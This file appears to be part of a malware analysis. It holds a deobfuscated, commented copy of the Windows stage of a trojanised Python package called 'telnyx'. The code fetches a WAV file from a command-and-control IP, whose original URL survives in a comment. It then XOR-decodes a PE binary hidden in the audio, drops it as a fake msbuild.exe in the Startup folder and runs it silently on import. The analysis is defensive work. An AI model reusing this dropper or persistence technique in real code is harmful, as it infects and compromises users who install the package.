# Stage 0w: Windows Attack Path — deobfuscated
#
# This is a clean, readable version of the setup() function from _client.py
# with all base64 obfuscation decoded inline.
#
# The Windows path downloads a PE binary hidden inside a WAV audio file,
# writes it to the Windows Startup folder as msbuild.exe (masquerading as
# Microsoft's legitimate MSBuild tool), and executes it without a visible window.
#
# NOTE: In v4.87.1, this function was defined as setup() but called as Setup()
# (capital S), causing a NameError that silently prevented execution on
# case-sensitive systems. v4.87.2 fixed the casing bug.
#
# DEFANGED: All attacker-controlled URLs have been neutralized.

import subprocess
import time
import os
import base64
import wave
import urllib.request


def setup():
    """Windows-only: download PE binary via WAV steganography, persist in Startup folder."""

    # Only run on Windows
    if os.name != 'nt':
        return

    try:
        # Build path to Startup folder
        # %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe
        appdata = os.getenv('APPDATA')
        startup_dir = r'Microsoft\Windows\Start Menu\Programs\Startup'
        exe_name = 'msbuild.exe'

        p = os.path.join(appdata, startup_dir, exe_name)
        l = p + '.lock'   # Rate-limiting lock file
        t = p + '.tmp'    # Temporary WAV download

        # Already infected — abort
        if os.path.exists(p):
            return

        # Rate limit: if lock file exists and is < 12 hours old, abort
        if os.path.exists(l):
            m_time = os.path.getmtime(l)
            if (time.time() - m_time) < 43200:  # 43200 seconds = 12 hours
                return

        # Create lock file with current timestamp
        with open(l, 'w') as f:
            f.write(str(time.time()))

        # Hide the lock file via attrib +h
        try:
            subprocess.run(['attrib', '+h', l], capture_output=True)
        except:
            pass

        # Download hangup.wav from C2
        # DEFANGED — original: http://83.142.209.203:8080/hangup.wav
        r = urllib.request.Request(
            'hXXp://83[.]142[.]209[.]203:8080/hangup.wav',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(r, timeout=15) as resp:
            with open(t, "wb") as f:
                f.write(resp.read())

        # WAV steganography: extract PE binary from audio frames
        with wave.open(t, 'rb') as w:
            b = base64.b64decode(w.readframes(w.getnframes()))
            xor_key = b[:8]           # First 8 bytes = XOR key
            ciphertext = b[8:]        # Remainder = encrypted PE binary
            payload = bytes([
                ciphertext[i] ^ xor_key[i % len(xor_key)]
                for i in range(len(ciphertext))
            ])
            # Write decoded PE binary to Startup folder as msbuild.exe
            with open(p, "wb") as f:
                f.write(payload)

        # Clean up temporary WAV file
        if os.path.exists(t):
            os.remove(t)

        # Execute the dropped binary with CREATE_NO_WINDOW (0x08000000)
        # This prevents any visible console window from appearing
        subprocess.Popen([p], creationflags=0x08000000)

    except:
        pass


# Called at module level on `import telnyx`
setup()
